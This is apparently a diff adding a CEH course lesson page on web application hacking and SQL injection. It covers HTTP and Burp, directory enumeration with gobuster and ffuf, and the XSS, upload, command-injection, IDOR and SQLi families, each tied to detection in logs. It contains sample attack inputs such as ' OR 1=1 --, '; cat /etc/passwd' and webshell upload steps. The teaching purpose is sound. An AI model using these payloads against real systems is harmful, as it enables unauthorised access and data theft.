@@ -1,0 +1,1140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Session 08 — Web Application Hacking &amp; SQL Injection | CEH · ITGate Academy</title>
+<meta name="description" content="CEH Diploma Session 8 — Web Application Hacking \&amp; SQL Injection: HTTP and Burp, web enumeration, the OWASP Top 10 attack surface, then the attacks themselves — XSS, file upload to shell, command injection, IDOR, and SQL injection from a manual auth-bypass through UNION and blind extraction to sqlmap — every attack carried to its access-log SOC flip, ending in detection rules and a web-app pentest finding report.">
+<link rel="stylesheet" href="../assets/css/ceh.css">
+<link rel="icon" href="../assets/img/itgate-logo.jpg">
+</head>
+<body data-session="s08">
+
+<header class="topbar">
+  <div class="wrap topbar-inner">
+    <a class="brand" href="../index.html">
+      <img src="../assets/img/itgate-logo.jpg" alt="ITGate Academy">
+      <span class="brand-text">
+        <span class="brand-name">ITGate Academy</span>
+        <span class="brand-sub">CEH · Session 08</span>
+      </span>
+    </a>
+    <nav class="topnav">
+      <a href="../index.html">All sessions</a>
+      <a href="../index.html#lab">Lab</a>
+      <a href="../index.html#resources">Resources</a>
+    </nav>
+  </div>
+</header>
+
+<div class="progress-wrap"><div class="wrap progress-inner" id="progressHost"></div></div>
+
+<div class="wrap section">
+<div class="page-layout">
+
+  <aside class="sidebar">
+    <h5>Session 08 · Pages</h5>
+    <ol id="sessionNav"></ol>
+    <div class="side-cta">
+      <h5>Deliverable</h5>
+      <a href="report.html">📋 Open Team Report</a>
+    </div>
+  </aside>
+
+  <article>
+
+  <svg aria-hidden="true" focusable="false" width="0" height="0" style="position:absolute">
+    <defs>
+      <marker id="ar-o" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#ff7043"/></marker>
+      <marker id="ar-c" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#22d3ee"/></marker>
+      <marker id="ar-g" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#768290"/></marker>
+      <marker id="ar-r" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#e63946"/></marker>
+      <marker id="ar-grn" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#4ade80"/></marker>
+      <marker id="ar-am" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#fbbf24"/></marker>
+      <marker id="ar-pu" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#a78bfa"/></marker>
+    </defs>
+  </svg>
+
+  <section class="page" data-title="Cover">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08</span><span class="tag cover"></span></div>
+      <h1>Session 8 &mdash; Web Application Hacking &amp; SQL Injection</h1>
+      <p class="lede">The front door to almost every network. Learn the web the way an attacker reads it &mdash; then the injection flaws that turn a text box into a shell.</p>
+    </div>
+    <div class="content">
+<div class="cover-hero">
+      <p>In Session 7 you analysed malware &mdash; but how did it get in? Overwhelmingly through the <strong class="hl">web application</strong>:
+      a login form, an upload field, a search box. Web apps are exposed to the whole internet by design, which makes them the number-one
+      initial-access vector you will ever defend.</p>
+      <p>This session teaches the web the way an attacker sees it: intercept every request with Burp, map the attack surface (OWASP Top 10),
+      then work the injection flaws one by one &mdash; <strong>XSS</strong>, <strong>file upload to shell</strong>, <strong>command injection</strong>,
+      <strong>IDOR</strong>, and the crown jewel, <strong class="hl">SQL injection</strong> &mdash; from a manual <span class="mono">' OR 1=1 --</span>
+      auth bypass all the way to <span class="mono">sqlmap</span>. Every attack ends where the defender lives: the <strong class="hl hl-d">access
+      log</strong>, a detection rule, and the one fix that closes it.</p>
+      <div class="cover-meta">
+        <span>&#9201; ~4 hours</span><span>&#9670; 11 mini-labs + 5 attack labs</span><span>&#128273; Deliverable: a web-app pentest finding report</span>
+      </div>
+    </div><div class="box intro"><span class="box-t">How this session runs</span><p>Every concept ends with a <strong>&#9654; Prove it</strong> mini-lab you can run against <span class="mono">DVWA</span> or <span class="mono">PortSwigger&#39;s Web Security Academy</span>. The stepped diagrams <strong>play</strong> &mdash; watch a request cross the proxy, a stored XSS fire, an auth bypass slip through. Attack it, watch it, then read the log it left.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="From payload to front door">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P02</span><span class="tag bridge">Recap &middot; where this fits</span><span class="time">&#9201; 4 min</span></div>
+      <h1>How the Malware Got In</h1>
+      <p class="lede">Session 7 was the payload after it landed. Session 8 is the door it came through &mdash; the web app that faces the entire internet.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">The thread so far</span><p>You have exploited services (S5), escalated (S6), and analysed the malware (S7). But most real intrusions do not start with an exploit against a patched service &mdash; they start with a <strong>web application flaw</strong>: a form that trusts its input. The web app is the biggest, most exposed attack surface an organisation has, and injection is how it falls. Today you learn to find and prove those flaws, then to catch them.</p></div>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 370" role="img" aria-label="The web-app initial-access chain: an attacker interacts with an exposed web application, injects into a trusting input, and turns it into code execution or data theft.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--red)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--red)">ATTACKER</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">a browser + Burp</text>
+          <line x1="185" y1="80" x2="185" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="395" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="520" y="54" text-anchor="middle" font-size="14" fill="var(--cyan)">WEB APP</text>
+          <text class="d-sub" x="520" y="70" text-anchor="middle">exposed to the internet</text>
+          <line x1="520" y1="80" x2="520" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="765" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="890" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">DATABASE / OS</text>
+          <text class="d-sub" x="890" y="70" text-anchor="middle">behind the app</text>
+          <line x1="890" y1="80" x2="890" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <text x="352" y="106" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--text-3)">ordinary request &mdash; login, upload, search</text>
+          <path d="M191,120 L514,120" fill="none" stroke="var(--text-3)" stroke-width="2" marker-end="url(#ar-g)"/>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="352" y="160" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">malicious input into a trusting field</text>
+          <path d="M191,174 L514,174" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <text x="705" y="214" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">app passes it to the DB / OS unsanitised</text>
+          <path d="M526,228 L884,228" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:26px">
+          <text x="537" y="268" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">data dumped / shell returned</text>
+          <path d="M884,282 L191,282" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:-26px">
+          <rect x="245" y="314" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--green)"/>
+          <text x="470" y="334" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--green)">SOC flip: it is all in the access log &amp; WAF</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>The attacker looks like any user at first &mdash; the app is meant to be reached by anyone.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>' OR 1=1 --, a &lt;script&gt; tag, ; cat /etc/passwd, a .php upload. The flaw is that the app trusts input.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>The injected data is interpreted as code by the database or shell behind the app. This is the whole class of injection.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>Credentials, records, or a reverse shell &mdash; the foothold that a Session 5 exploit would otherwise be needed for.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>Unlike a binary exploit, web attacks are HTTP &mdash; every payload is a request line a WAF or log rule can catch. The defence is very reachable.</div>
+        </figure>
+      <div class="box key-takeaway"><span class="box-t">Why the web app first</span><p><strong class="hl">The web app is the internet-facing door.</strong> Injection flaws let an attacker skip the exploit and walk in through a form. Learn to find them as an attacker, and you know exactly what to log and block as a defender.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Why web security">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P03</span><span class="tag theory">Why &middot; the biggest surface</span><span class="time">&#9201; 5 min</span></div>
+      <h1>Why the Web App Is the Center of the Attack Surface</h1>
+      <p class="lede">It is exposed to everyone, it handles the data, and its flaws are cheap to find. Here is why this is the highest-yield offensive skill.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Exposed by design</span><p>A firewall hides internal services; a web app is <strong>meant</strong> to be reached by the whole internet. That exposure, multiplied by custom code written under deadline, is why web application flaws dominate breach reports and bug-bounty payouts. The <strong>OWASP Top 10</strong> is the industry&#39;s ranked list of what goes wrong &mdash; and injection and broken access control sit at the very top.</p></div>      <div class="stat-row">
+        <div class="stat"><span class="stat-n">OWASP #1&ndash;#3</span><span class="stat-l">Broken Access Control, Cryptographic Failures, and Injection lead the Top 10 &mdash; the classes this session covers</span></div>
+        <div class="stat"><span class="stat-n">Every app</span><span class="stat-l">has inputs, and every input is a test surface &mdash; the rule: test <em>all</em> of them</span></div>
+        <div class="stat"><span class="stat-n">HTTP</span><span class="stat-l">every web attack is a request &mdash; which makes it visible in logs and blockable at a WAF</span></div>
+      </div><div class="box case"><span class="box-t">Real-world anchor &mdash; SQL injection, still</span><p>SQL injection is decades old and still breaches production systems &mdash; from retail giants to government portals &mdash; because one line of code (<span class="mono">"...WHERE user='" + input + "'"</span>) concatenates user input into a query. The fix has existed for just as long (parameterised queries). The gap between &quot;known fix&quot; and &quot;still shipping the bug&quot; is exactly why you must be able to find it.</p></div><div class="box key-takeaway"><span class="box-t">Why you specifically</span><p><strong class="hl">Custom code, public exposure, repeatable flaws.</strong> Web apps are where attackers get in and where defenders have the clearest signal. Master this and you cover the most common initial-access vector on both sides.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="How the web works">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P04</span><span class="tag theory">Method &middot; the stack</span><span class="time">&#9201; 7 min</span></div>
+      <h1>The Web Stack &mdash; Client, Server, Database</h1>
+      <p class="lede">You cannot attack what you cannot picture. Map the three tiers and where trust is misplaced between them.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Three tiers, one trust problem</span><p>A web application is three layers: the <strong>client</strong> (your browser runs HTML/JavaScript), the <strong>server</strong> (PHP/Python/Node runs the logic), and the <strong>database</strong> (SQL stores the data). Almost every web vulnerability is a failure to distinguish <em>data</em> from <em>code</em> as it crosses one of those boundaries. Click each tier.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 200" role="img" aria-label="The three-tier web stack: client, server, and database, with the boundaries where injection happens. Click each tier.">
+          <g class="node" data-node="cli" tabindex="0"><rect x="30" y="50" width="250" height="100" rx="12" fill="#1a1f2a" stroke="#22d3ee"/><text class="d-title" x="155" y="86" text-anchor="middle" font-size="15" fill="#22d3ee">CLIENT</text><text class="d-sub" x="155" y="110" text-anchor="middle">browser &middot; HTML + JavaScript</text><text class="d-sub" x="155" y="130" text-anchor="middle">where XSS runs</text></g>
+          <g class="node" data-node="srv" tabindex="0"><rect x="345" y="50" width="250" height="100" rx="12" fill="#1f2533" stroke="#fbbf24"/><text class="d-title" x="470" y="86" text-anchor="middle" font-size="15" fill="#fbbf24">SERVER</text><text class="d-sub" x="470" y="110" text-anchor="middle">PHP / Python / Node</text><text class="d-sub" x="470" y="130" text-anchor="middle">upload, cmd-injection, logic</text></g>
+          <g class="node" data-node="db" tabindex="0"><rect x="660" y="50" width="250" height="100" rx="12" fill="#241417" stroke="#ff7043"/><text class="d-title" x="785" y="86" text-anchor="middle" font-size="15" fill="#ff7043">DATABASE</text><text class="d-sub" x="785" y="110" text-anchor="middle">SQL &middot; the data</text><text class="d-sub" x="785" y="130" text-anchor="middle">where SQLi runs</text></g>
+          <path d="M280,90 L343,90" stroke="#768290" stroke-width="1.6" marker-end="url(#ar-g)"/><text x="311" y="82" text-anchor="middle" font-size="10" class="d-sub">HTTP</text>
+          <path d="M343,120 L280,120" stroke="#768290" stroke-width="1.6" marker-end="url(#ar-g)"/>
+          <path d="M595,90 L658,90" stroke="#768290" stroke-width="1.6" marker-end="url(#ar-g)"/><text x="626" y="82" text-anchor="middle" font-size="10" class="d-sub">SQL</text>
+          <path d="M658,120 L595,120" stroke="#768290" stroke-width="1.6" marker-end="url(#ar-g)"/>
+        </svg>
+        <div class="dgm-hint">Click each tier &mdash; what runs there and which attack lives at its boundary.</div>
+        <div class="dgm-detail" data-detail="cli"><h5><span class="dd-tag">CLIENT</span>The browser runs code you can influence</h5><p><b>HTML renders and JavaScript executes in the victim&#39;s browser.</b> If the app reflects your input into a page without encoding it, your JavaScript runs in <em>their</em> session &mdash; that is <b>XSS</b>. Client-side controls (hidden fields, JS validation) are suggestions, not security: you control your own browser.</p></div>
+        <div class="dgm-detail" data-detail="srv"><h5><span class="dd-tag">SERVER</span>Where your input becomes action</h5><p><b>Server code turns requests into behaviour &mdash; reading files, running commands, building queries.</b> If it passes your input to the OS (<b>command injection</b>), saves an executable you uploaded (<b>file upload</b>), or trusts an ID you sent (<b>IDOR</b>), you reach past the app. This tier is where footholds happen.</p></div>
+        <div class="dgm-detail" data-detail="db"><h5><span class="dd-tag">DATABASE</span>The data behind everything</h5><p><b>The app builds SQL queries from your input and sends them to the database.</b> If it concatenates your input into the query string instead of parameterising it, your input becomes <em>query logic</em> &mdash; that is <b>SQL injection</b>, and it can read or dump the entire database.</p></div>
+      </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; see the three tiers in one request</span><pre><code># In your browser dev-tools Network tab, submit any login form and watch:
+#   CLIENT  -> the JS that runs and the request it builds
+#   SERVER  -> the response (status, headers, Set-Cookie)
+#   (DB is invisible from outside — but the response reveals when your input reached it)
+curl -i -X POST -d 'user=admin&pass=x' http://TARGET/login   # the raw request/response</code></pre><p style="margin-top:8px"><b>You should see:</b> one form submission crosses all three tiers. The attacker&#39;s whole job is finding the boundary where <b>data</b> is mistaken for <b>code</b> &mdash; and each boundary has its own attack.</p></div><div class="box key-takeaway"><span class="box-t">Data vs code, at every boundary</span><p><strong class="hl">Every web vuln is data treated as code.</strong> XSS at the browser, injection at the OS or database, trust at the server. Picture the three tiers and each attack has an obvious home.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="HTTP &amp; Burp">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P05</span><span class="tag tool">Tool &middot; intercept everything</span><span class="time">&#9201; 7 min</span></div>
+      <h1>HTTP &amp; Burp Suite &mdash; See Every Request</h1>
+      <p class="lede">The web speaks HTTP, and Burp sits in the middle of the conversation. If you cannot intercept and edit a request, you cannot test one.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">The proxy is the whole game</span><p>Web testing is request-editing. The browser hides most of what it sends; <strong>Burp Suite</strong> is a proxy that sits between your browser and the server so you can <strong>intercept, read, modify, and replay</strong> every request. Client-side validation (a dropdown, a length limit, disabled JS) evaporates the moment you edit the request in Burp &mdash; because the server only sees the HTTP you send.</p></div>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 316" role="img" aria-label="How Burp intercepts: the browser sends a request, Burp holds it for the attacker to modify, then forwards the modified request to the server.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--cyan)">BROWSER</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">the client</text>
+          <line x1="185" y1="80" x2="185" y2="294" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="395" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="520" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">BURP PROXY</text>
+          <text class="d-sub" x="520" y="70" text-anchor="middle">attacker-controlled</text>
+          <line x1="520" y1="80" x2="520" y2="294" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="765" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--red)"/>
+          <text class="d-title" x="890" y="54" text-anchor="middle" font-size="14" fill="var(--red)">SERVER</text>
+          <text class="d-sub" x="890" y="70" text-anchor="middle">the web app</text>
+          <line x1="890" y1="80" x2="890" y2="294" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <text x="352" y="106" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--text-3)">request (login, upload, search)</text>
+          <path d="M191,120 L514,120" fill="none" stroke="var(--text-3)" stroke-width="2" marker-end="url(#ar-g)"/>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <rect x="245" y="152" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--orange)"/>
+          <text x="470" y="172" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--orange)">Burp HOLDS the request &mdash; attacker reads &amp; edits it</text>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <text x="705" y="214" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">MODIFIED request forwarded</text>
+          <path d="M526,228 L884,228" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:26px">
+          <text x="537" y="268" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--green)">response &mdash; also inspectable in Burp</text>
+          <path d="M884,282 L191,282" fill="none" stroke="var(--green)" stroke-width="2" marker-end="url(#ar-grn)"/>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>The browser sends the raw HTTP request &mdash; but to Burp, not straight to the server.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>This is the power: change a parameter, remove a length limit, swap an id, inject a payload &mdash; anything, because the server has not seen it yet.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>The server receives the attacker&#39;s version. Client-side controls are already bypassed &mdash; they only lived in the browser.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>Burp shows the full response too (status, headers, body), and Repeater lets you replay-and-tweak the request endlessly.</div>
+        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; intercept and modify one request</span><pre><code># 1. Set your browser proxy to 127.0.0.1:8080 (Burp), turn Intercept ON.
+# 2. Submit any form on DVWA.
+# 3. In Burp, change a parameter value, then Forward.
+# 4. Right-click -> Send to Repeater to replay and tweak it freely.
+# The server acts on YOUR edited request — client-side limits are gone.</code></pre><p style="margin-top:8px"><b>You should see:</b> you changed what the server received after the browser was done with it. That single ability &mdash; edit the request in flight &mdash; is what makes every attack in this session possible.</p></div><div class="box key-takeaway"><span class="box-t">Own the request</span><p><strong class="hl">The server only sees the HTTP you send.</strong> Burp lets you send anything, so client-side validation is never a security control. Intercept, edit, replay &mdash; that reflex underlies XSS, upload, injection, all of it.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Web enumeration">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P06</span><span class="tag tool">Tool &middot; map before you attack</span><span class="time">&#9201; 7 min</span></div>
+      <h1>Web Enumeration &mdash; Find the Hidden Surface</h1>
+      <p class="lede">An app is bigger than its links. Before attacking, map its directories, parameters, and endpoints &mdash; you cannot test what you cannot see.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Attack surface = what you can find</span><p>The visible site is a fraction of what is there: admin panels, backup files, old endpoints, API routes, and parameters not shown in any link. <strong>Content and parameter discovery</strong> brute-forces these from wordlists, turning an unknown app into a mapped one. More surface found = more places to test &mdash; enumeration is the multiplier on everything that follows.</p></div>
+      <h2 class="mono" style="color:var(--orange)"><span class="h-t">Web enumeration (gobuster / ffuf / ParamSpider) &mdash; the 7-part frame</span></h2>
+<div class="tbl-scroll">
+<table><colgroup><col style="width:38%"><col style="width:62%"></colgroup>
+<tbody>
+<tr><td style="width:150px"><strong>What it is</strong></td><td>Content-discovery tools (<span class="mono">gobuster</span>, <span class="mono">ffuf</span>, <span class="mono">dirb</span>, <span class="mono">feroxbuster</span>) brute-force paths from a wordlist; parameter/subdomain tools (<span class="mono">ParamSpider</span>, <span class="mono">Sublist3r</span>, <span class="mono">Amass</span>) find inputs and hostnames.</td></tr>
+<tr><td style="width:150px"><strong>Why it exists</strong></td><td>To reveal the endpoints, files, and parameters the app never links to &mdash; the hidden attack surface where the untested, vulnerable code usually lives.</td></tr>
+<tr><td style="width:150px"><strong>The method</strong></td><td>Start with <span class="mono">robots.txt</span> and the sitemap, then brute-force directories with a good wordlist, note interesting extensions (<span class="mono">.php</span>, <span class="mono">.bak</span>, <span class="mono">.zip</span>), and discover parameters to feed the injection tests.</td></tr>
+<tr><td style="width:150px"><strong>Real syntax</strong></td><td><pre><code>gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak
+ffuf -u http://target/FUZZ -w wordlist.txt -e .php,.bak -mc 200,301,403
+curl -s http://target/robots.txt          # free hints, always check
+sublist3r -d target.com                    # subdomains = more apps</code></pre></td></tr>
+<tr><td style="width:150px"><strong>Read the output</strong></td><td><b>Status codes</b> guide you: <span class="mono">200</span> exists, <span class="mono">301/302</span> redirect (often a real dir), <span class="mono">403</span> exists-but-forbidden (interesting!), <span class="mono">401</span> auth-required. A <span class="mono">403</span> on <span class="mono">/admin</span> is a finding, not a dead end.</td></tr>
+<tr><td style="width:150px"><strong>What it feeds</strong></td><td>Each discovered endpoint and parameter becomes a test target for the attacks in this session (XSS, injection, IDOR); admin/backup files feed direct exploitation.</td></tr>
+<tr><td style="width:150px"><strong>SOC flip</strong></td><td><span style="color:var(--green)">Extremely loud.</span> Hundreds/thousands of 404s from one source in seconds is the classic content-discovery signature &mdash; a web-server access-log rule (high 404 rate per IP) or WAF catches it instantly. On a real engagement you throttle and use a targeted wordlist.</td></tr>
+</tbody></table>
+</div>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; map hidden surface with gobuster</span><pre><code>gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,bak,txt
+# watch for:  /admin (403), /uploads (301), /config.php.bak (200)
+curl -s http://TARGET/robots.txt   # often lists the paths they wanted hidden</code></pre><p style="margin-top:8px"><b>You should see:</b> you turned a handful of visible links into a full map of directories and files &mdash; including the ones the developers assumed nobody would find. Every hit is a new place to test.</p></div><div class="box key-takeaway"><span class="box-t">Enumeration multiplies everything</span><p><strong class="hl">You can only test what you find.</strong> Map the directories, files, and parameters first; the vulnerable code is almost always in the endpoint nobody linked to. It is also loud &mdash; the same activity is a top web-log detection.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="The web attack surface">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P07</span><span class="tag theory">Method &middot; OWASP Top 10</span><span class="time">&#9201; 6 min</span></div>
+      <h1>The Web Attack Surface &mdash; What Actually Goes Wrong</h1>
+      <p class="lede">Five attack families cover almost everything you will test today. Learn the map, then work each one in turn.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">A map of this session</span><p>The <strong>OWASP Top 10</strong> ranks web risks; the five below are the ones you can find and prove by hand, and they are the spine of this session. Each is a different boundary where the app trusts input it should not. Click each &mdash; what it is, the input it abuses, and the page where you attack it.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 210" role="img" aria-label="The web attack surface for this session: XSS, file upload, command injection, IDOR, and SQL injection. Click each.">
+          <rect x="360" y="12" width="220" height="38" rx="9" fill="#1f2533" stroke="#e63946"/><text class="d-title" x="470" y="37" text-anchor="middle" font-size="14">TRUSTING INPUT</text>
+          <g class="node" data-node="xss" tabindex="0"><rect x="20" y="80" width="170" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="105" y="102" text-anchor="middle" font-size="12.5">XSS</text><text class="d-sub" x="105" y="120" text-anchor="middle">JS in the browser</text></g>
+          <g class="node" data-node="upl" tabindex="0"><rect x="205" y="80" width="170" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="290" y="102" text-anchor="middle" font-size="12.5">File upload</text><text class="d-sub" x="290" y="120" text-anchor="middle">webshell &rarr; RCE</text></g>
+          <g class="node" data-node="cmd" tabindex="0"><rect x="390" y="80" width="170" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="475" y="102" text-anchor="middle" font-size="12.5">Command inj.</text><text class="d-sub" x="475" y="120" text-anchor="middle">OS commands</text></g>
+          <g class="node" data-node="idor" tabindex="0"><rect x="575" y="80" width="170" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="660" y="102" text-anchor="middle" font-size="12.5">IDOR</text><text class="d-sub" x="660" y="120" text-anchor="middle">change the id</text></g>
+          <g class="node" data-node="sqli" tabindex="0"><rect x="760" y="80" width="170" height="52" rx="8" fill="#241417" stroke="#e63946"/><text class="d-lbl" x="845" y="102" text-anchor="middle" font-size="12.5" fill="#e63946">SQL injection</text><text class="d-sub" x="845" y="120" text-anchor="middle">own the database</text></g>
+          <path d="M430,50 L120,78" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+          <path d="M450,50 L300,78" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+          <path d="M470,50 L475,78" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+          <path d="M490,50 L655,78" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+          <path d="M510,50 L840,78" fill="none" stroke="#768290" stroke-width="1.1" marker-end="url(#ar-g)"/>
+        </svg>
+        <div class="dgm-hint">Click each family &mdash; the boundary it abuses and where you attack it today.</div>
+        <div class="dgm-detail" data-detail="xss"><h5><span class="dd-tag">XSS &rarr; the browser</span>Your JavaScript, their session</h5><p><b>The app reflects your input into a page without encoding it, so your <span class="mono">&lt;script&gt;</span> runs in another user&#39;s browser.</b> Steals cookies/sessions, keylogs, rewrites the page. Reflected, stored, DOM-based. Attacked on the next two pages + Lab A.</p></div>
+        <div class="dgm-detail" data-detail="upl"><h5><span class="dd-tag">FILE UPLOAD &rarr; RCE</span>Upload code, then run it</h5><p><b>The app lets you upload a file and stores it somewhere executable, so you upload a webshell (<span class="mono">.php</span>) and browse to it for a shell.</b> The fastest path from web bug to server foothold. Lab B.</p></div>
+        <div class="dgm-detail" data-detail="cmd"><h5><span class="dd-tag">COMMAND INJECTION &rarr; the OS</span>Your input becomes a shell command</h5><p><b>The app builds an OS command from your input (<span class="mono">ping &lt;input&gt;</span>) so <span class="mono">; cat /etc/passwd</span> runs too.</b> Direct code execution on the server. Attacked mid-session.</p></div>
+        <div class="dgm-detail" data-detail="idor"><h5><span class="dd-tag">IDOR &rarr; broken access control</span>Change the number, see their data</h5><p><b>The app trusts an object id you send (<span class="mono">?id=123</span>) without checking it is yours, so <span class="mono">?id=124</span> shows another user&#39;s data.</b> OWASP #1 (Broken Access Control). No exotic payload &mdash; just changing a value.</p></div>
+        <div class="dgm-detail" data-detail="sqli"><h5><span class="dd-tag">SQL INJECTION &rarr; the database</span>The crown jewel</h5><p><b>Your input becomes query logic, so you bypass logins, dump tables, and sometimes reach the OS.</b> The most impactful web flaw &mdash; the entire second half of this session, from manual auth bypass to <span class="mono">sqlmap</span>.</p></div>
+      </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; pick the family from the symptom</span><pre><code># Match the observation to the family:
+#  'my input appears verbatim in the page'        -> XSS (test &lt;script&gt;)
+#  '?id=123 in the URL shows MY record'           -> IDOR (try 124)
+#  'a field feeds a ping/lookup tool'             -> command injection (; id)
